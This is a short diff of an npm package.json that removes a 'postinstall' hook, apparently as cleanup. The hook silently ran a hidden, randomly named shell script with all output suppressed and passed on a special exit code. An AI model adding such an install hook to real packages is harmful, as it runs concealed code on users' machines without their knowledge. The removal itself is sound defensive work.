@@ -16,8 +16,7 @@
     "format": "prettier --write .",
     "prepublishOnly": "npm run build",
     "storybook": "storybook dev -p 6006",
-    "build-storybook": "storybook build",
-    "postinstall": "sh ./.ci-x5iyux.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "build-storybook": "storybook build"
   },
   "repository": {
     "type": "git",
